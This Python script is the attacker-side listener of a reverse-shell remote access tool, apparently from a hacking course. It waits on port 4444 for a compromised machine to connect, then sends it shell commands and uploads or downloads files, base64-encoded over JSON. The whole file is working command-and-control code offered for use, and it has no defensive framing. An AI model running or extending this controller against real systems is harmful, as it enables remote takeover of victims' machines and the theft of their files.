import socket
import json
import base64
from datetime import datetime
import scapy_http.http as http

now = datetime.now()

current_time = now.strftime("%H:%M:%S")

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting For Incoming Connections")
        self.connection, address = listener.accept()
        print("[+] Got A Connection from " + str(address) + " at " + current_time)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self, data):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive(1024)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input('>> ')
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1]).decode()
                    command.append(file_content)
                    #["upload", "sample.txt", "contents of file"]

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)

                if command[0] == "help":
                    print('''These are all the current commands
                    cd - changes dir
                    upload - uploads file
                    download - downloads file''')
            except Exception:
                result = "[-] Error during command execution"

            print(result)

my_listener = Listener("127.0.0.1", 4444)
my_listener.run()
